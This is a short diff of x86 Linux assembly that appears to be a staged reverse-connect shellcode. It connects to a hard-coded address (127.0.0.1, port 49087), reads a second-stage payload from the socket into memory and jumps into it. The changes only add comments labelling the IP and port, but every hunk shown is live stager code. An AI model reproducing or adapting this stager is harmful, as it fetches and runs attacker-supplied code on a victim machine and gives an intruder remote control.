@@ -37,8 +37,8 @@ socket:
 
 connect:
 	pop  ebx
-	push dword 0x0100007f
-	push word 0xbfbf
+	push dword 0x0100007f ; ip: 127.0.0.1
+	push word 0xbfbf      ; port: 49087
 	push bx
 	mov  ecx, esp
 	push byte 0x66
@@ -56,5 +56,6 @@ recv:
 	mov  dh, 0xc
 	mov  al, 0x3
 	int  0x80
-	mov  edi, ebx    ; not necessary if second stages use ebx instead of edi for fd
+	mov  edi, ebx         ; not necessary if second stages use ebx instead of 
+	                      ; edi for fd
 	jmp  ecx
